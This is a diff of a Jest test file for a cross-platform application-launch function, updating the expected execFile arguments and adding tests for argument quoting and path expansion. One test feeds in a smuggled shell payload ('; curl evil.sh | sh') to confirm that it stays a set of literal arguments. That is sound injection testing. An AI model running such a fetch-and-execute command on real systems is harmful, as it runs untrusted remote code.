@@ -76,7 +76,7 @@ describe('Application Action', () => {
 
         const result = await executeApplication(action);
 
-        expect(execFile).toHaveBeenCalledWith('open', ['/Applications/Calculator.app'], expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('open', ['-a', '/Applications/Calculator.app'], expect.any(Function));
         expect(result).toEqual({
           success: true,
           message: 'Application launched successfully',
@@ -96,7 +96,7 @@ describe('Application Action', () => {
 
         expect(execFile).toHaveBeenCalledWith(
           'open',
-          ['-a', '/Applications/Calculator.app', '--some-param'],
+          ['-a', '/Applications/Calculator.app', '--args', '--some-param'],
           expect.any(Function)
         );
         expect(result).toEqual({
@@ -119,7 +119,7 @@ describe('Application Action', () => {
         // Metacharacters become literal argv entries, never a shell command
         expect(execFile).toHaveBeenCalledWith(
           'open',
-          ['-a', '/Applications/Calculator.app', ';', 'curl', 'evil.sh', '|', 'sh'],
+          ['-a', '/Applications/Calculator.app', '--args', ';', 'curl', 'evil.sh', '|', 'sh'],
           expect.any(Function)
         );
       });
@@ -137,7 +137,7 @@ describe('Application Action', () => {
 
         expect(execFile).toHaveBeenCalledWith(
           'open',
-          ['-a', '/Applications/Calculator.app', '--file', 'my document.txt'],
+          ['-a', '/Applications/Calculator.app', '--args', '--file', 'my document.txt'],
           expect.any(Function)
         );
       });
@@ -156,7 +156,7 @@ describe('Application Action', () => {
 
         expect(execFile).toHaveBeenCalledWith(
           'open',
-          ['-a', '/Applications/Visual Studio Code.app', `${os.homedir()}/workspace/sample-project`],
+          ['-a', '/Applications/Visual Studio Code.app', '--args', `${os.homedir()}/workspace/sample-project`],
           expect.any(Function)
         );
       });
@@ -174,7 +174,7 @@ describe('Application Action', () => {
 
         expect(execFile).toHaveBeenCalledWith(
           'open',
-          ['-a', '/Applications/Calculator.app', '~otheruser/docs'],
+          ['-a', '/Applications/Calculator.app', '--args', '~otheruser/docs'],
           expect.any(Function)
         );
       });
@@ -248,7 +248,7 @@ describe('Application Action', () => {
         fs.existsSync.mockReturnValue(true);
       });
 
-      test('should execute application without parameters using xdg-open', async () => {
+      test('should execute the Linux application directly without parameters', async () => {
         const action = { applicationPath: '/usr/bin/calculator' };
         execFile.mockImplementation((file, args, callback) => {
           callback(null);
@@ -256,7 +256,7 @@ describe('Application Action', () => {
 
         const result = await executeApplication(action);
 
-        expect(execFile).toHaveBeenCalledWith('xdg-open', ['/usr/bin/calculator'], expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('/usr/bin/calculator', [], expect.any(Function));
         expect(result).toEqual({
           success: true,
           message: 'Application launched successfully',
@@ -283,6 +283,37 @@ describe('Application Action', () => {
           success: true,
           message: 'Application launched successfully',
         });
+      });
+    });
+
+    describe('argument boundaries', () => {
+      beforeEach(() => {
+        fs.existsSync.mockReturnValue(true);
+        execFile.mockImplementation((_file, _args, callback) => callback(null));
+        Object.defineProperty(process, 'platform', { value: 'win32' });
+      });
+
+      test.each([
+        ['--title="two words" --empty=""', ['--title=two words', '--empty=']],
+        [`"" '' "C:\\Program Files\\App"`, ['', '', 'C:\\Program Files\\App']],
+        ["--prefix='hello world' tail", ['--prefix=hello world', 'tail']],
+      ])('preserves quoted argv for %s', async (raw, args) => {
+        await executeApplication({ applicationPath: '/test/app', applicationParameters: raw });
+        expect(execFile).toHaveBeenCalledWith('/test/app', args, expect.any(Function));
+      });
+
+      test('rejects an unfinished quote without launching', async () => {
+        const result = await executeApplication({ applicationPath: '/test/app', applicationParameters: '--title="unfinished' });
+        expect(result.success).toBe(false);
+        expect(result.message).toContain('Unclosed quote');
+        expect(execFile).not.toHaveBeenCalled();
+      });
+
+      test('expands a home-relative application path before checking and launching', async () => {
+        await executeApplication({ applicationPath: '~/Apps/test' });
+        const expected = require('path').join(require('os').homedir(), 'Apps/test');
+        expect(fs.existsSync).toHaveBeenCalledWith(expected);
+        expect(execFile).toHaveBeenCalledWith(expected, [], expect.any(Function));
       });
     });
 
@@ -373,7 +404,7 @@ describe('Application Action', () => {
         const result = await executeApplication(action);
 
         // Empty string yields no params, so it uses the plain launch form
-        expect(execFile).toHaveBeenCalledWith('open', ['/test/app'], expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('open', ['-a', '/test/app'], expect.any(Function));
         expect(result.success).toBe(true);
       });
     });
